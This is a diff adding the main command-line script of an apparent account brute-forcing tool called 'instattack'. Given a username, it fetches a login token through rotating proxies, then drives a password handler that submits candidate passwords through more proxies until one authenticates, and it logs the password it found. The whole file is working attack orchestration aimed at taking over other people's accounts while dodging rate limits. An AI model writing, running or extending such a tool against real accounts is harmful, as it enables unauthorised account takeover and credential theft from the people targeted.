@@ -1,0 +1,224 @@
+#!/usr/bin/env python3
+from platform import python_version
+import logging
+import signal
+import sys
+import traceback
+
+import asyncio
+from plumbum import cli, local
+
+from instattack import exceptions
+from instattack.conf.utils import validate_log_level
+
+from instattack.logger import AppLogger, log_handling
+from instattack.logger.utils import handle_global_exception
+
+from instattack.users.models import User
+
+from instattack.utils import cancel_remaining_tasks
+from instattack.handlers import (
+    ProxyHandler, TokenHandler, ResultsHandler, PasswordHandler)
+
+
+# May want to catch other signals too - these are not currently being
+# used, but could probably be expanded upon.
+SIGNALS = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
+
+logging.getLogger("proxybroker").setLevel(logging.CRITICAL)
+
+log = AppLogger(__file__)
+
+
+class MyApp(cli.Application):
+
+    # TODO:  We should try to group these configuration settings better and
+    # include ones from settings for the brokers as well.  If they are grouped,
+    # they might be easier to specify for each handler they pertain to.
+
+    # Make max_error_rate and max_resp_time for proxies configurable, and if
+    # they are set, than we can filter the proxies we read by those values.
+    level = cli.SwitchAttr("--level", validate_log_level, default='INFO')
+    fetch_time = cli.SwitchAttr("--fetch_time", int, default=8)
+    connection_limit = cli.SwitchAttr("--connection_limit", int, default=100)
+    connector_timeout = cli.SwitchAttr("--connector_timeout", int, default=3)
+    password_limit = cli.SwitchAttr("--pwlimit", int, default=None)
+
+    # I do not think this is currently being used.
+    max_retries = cli.SwitchAttr("--max_retries", int, default=0)
+
+    # We need to group arguments into the post/get side.
+    # For post, this value is 200
+    broker_limit = cli.SwitchAttr("--broker_limit", int, default=100)
+
+    # We need to make this work better with our pool, the min_req_per_proxy thing
+    # does not make sense when they are done sequentially - you hit too many request
+    # errors.
+    min_req_proxy = cli.SwitchAttr("--min_req_proxy", int, default=5)
+    max_error_rate = cli.SwitchAttr("--max_error_rate", float, default=0.5)
+    max_resp_time = cli.SwitchAttr("--max_resp_time", int, default=8)
+    broker_backlog = cli.SwitchAttr("--broker_backlog", int, default=100)
+
+    def validate(self):
+        if int(python_version()[0]) < 3:
+            print('[!] Please use Python 3')
+            sys.exit()
+
+    def get_handlers(self, user):
+        proxy_handler = ProxyHandler(self.user, method='GET')
+        token_handler = TokenHandler(
+            user,
+            proxy_handler,
+            connection_limit=self.connection_limit,
+            connector_timeout=self.connector_timeout,
+            fetch_time=self.fetch_time
+        )
+        return proxy_handler, token_handler
+
+    def post_handlers(self, user):
+        proxy_handler = ProxyHandler(self.user, method='POST')
+        password_handler = PasswordHandler(
+            user,
+            proxy_handler,
+            connection_limit=self.connection_limit,
+            connector_timeout=self.connector_timeout,
+            fetch_time=self.fetch_time
+        )
+        return proxy_handler, password_handler
+
+    def main(self, username):
+        self.validate()
+        log.warning('Reminder: Look into plumbum colors instead of colorama')
+
+        self.user = User(username)
+        self.user.setup()
+
+        loop = asyncio.get_event_loop()
+        with log_handling(level=self.level):
+            try:
+                self.attack(loop)
+
+            # This would likely be exceptions from the proxybroker package since
+            # our other exceptions are handled in main().
+            except Exception as e:
+                exc_info = sys.exc_info()
+                e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
+                handle_global_exception(e)
+
+            finally:
+                loop.run_until_complete(self.shutdown(loop))
+                loop.close()
+
+    def attack(self, loop):
+
+        results = asyncio.Queue()
+        results_handler = ResultsHandler(self.user, results)
+
+        get_proxy_handler, token_handler = self.get_handlers(self.user)
+        try:
+            loop.run_until_complete(get_proxy_handler.prepopulate(loop))
+
+            task_results = loop.run_until_complete(asyncio.gather(
+                token_handler.consume(loop),
+
+                # I don't think this is working with the broker...
+                # We should test this without prepopulating to see if we
+                # are actually getting proxies coming through...
+                get_proxy_handler.produce(loop),
+
+                # I don't think this is finding proxies, but the above producer
+                # is working because of the prepopulated.
+                get_proxy_handler.start_server(loop),
+            ))
+
+        except Exception as e:
+            exc_info = sys.exc_info()
+            e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
+            handle_global_exception(e)
+
+            # Might not have been stopped if we hit an exception.
+            self.ensure_servers_shutdown(loop, get_proxy_handler)
+
+        else:
+            # Get Proxy Server Stopped Automatically
+            token = task_results[0]
+            if not token:
+                raise exceptions.FatalException("Token should not be null.")
+            log.notice('Received Token', extra={'token': token})
+
+            post_proxy_handler, password_handler = self.post_handlers(self.user)
+            try:
+                loop.run_until_complete(asyncio.gather(
+                    password_handler.prepopulate(loop, password_limit=self.password_limit),
+                    post_proxy_handler.prepopulate(loop)
+                ))
+
+            except Exception as e:
+                exc_info = sys.exc_info()
+                e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
+                handle_global_exception(e)
+
+            else:
+                auth_result_found = asyncio.Event()
+
+                try:
+                    task_results = loop.run_until_complete(asyncio.gather(
+                        results_handler.consume(loop, auth_result_found),
+                        password_handler.consume(loop, auth_result_found, token, results),
+
+                        # I don't think this is working with the broker...
+                        # We should test this without prepopulating to see if we
+                        # are actually getting proxies coming through...
+                        post_proxy_handler.produce(loop),
+
+                        # I don't think this is finding proxies, but the above producer
+                        # is working because of the prepopulated.
+                        post_proxy_handler.start_server(loop),
+                    ))
+
+                except Exception as e:
+                    exc_info = sys.exc_info()
+                    e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
+                    handle_global_exception(e)
+
+                    # Might not have been stopped if we hit an exception, but should
+                    # be stopped automatically if the block succeeds.  We will
+                    # leave this for now to make sure.
+                    self.ensure_servers_shutdown(loop, post_proxy_handler)
+                    loop.run_until_complete(results_handler.dump(loop))
+
+                else:
+                    # Post Proxy Server Stopped Automatically
+                    result = task_results[0]
+                    if result:
+                        log.notice(f'Authenticated User!', extra={
+                            'password': result.context.password
+                        })
+
+                finally:
+                    # Might not have been stopped if we hit an exception, but should
+                    # be stopped automatically if the block succeeds.  We will
+                    # leave this for now to make sure.
+                    self.ensure_servers_shutdown(loop, get_proxy_handler, post_proxy_handler)
+                    loop.run_until_complete(results_handler.dump(loop))
+
+    def ensure_servers_shutdown(self, loop, *handlers):
+        for handler in handlers:
+            if handler._server_running:
+                log.warning(f'{handler.method} Proxy Server Never Stopped.')
+                loop.run_until_complete(handler.stop_server(loop))
+
+    async def shutdown(self, loop, signal=None):
+
+        if signal:
+            log.warning(f'Received exit signal {signal.name}...')
+
+        with log.start_and_done('Shutting Down'):
+            with log.start_and_done('Cancelling Tasks'):
+                await cancel_remaining_tasks()
+
+            loop.stop()
+
+
+if __name__ == "__main__":
+    MyApp.run()
